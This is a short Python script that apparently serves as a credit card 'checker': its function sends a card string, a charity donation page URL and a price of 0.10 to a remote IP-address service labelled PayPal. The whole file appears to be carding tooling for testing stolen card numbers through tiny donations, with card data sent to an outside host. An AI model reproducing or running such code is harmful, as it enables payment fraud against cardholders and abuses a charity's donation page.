import requests

def chkk(ccx):
    cc = ccx.strip()
    urll = "https://asburyhouse.net/donate/"
    price = "0.10"
    api = "http://151.247.197.54:5500/paypal"
    params = {
        "cc": cc,
        "url": urll,
        "price": price
    }
    res = requests.get(api, params=params).text
    return res
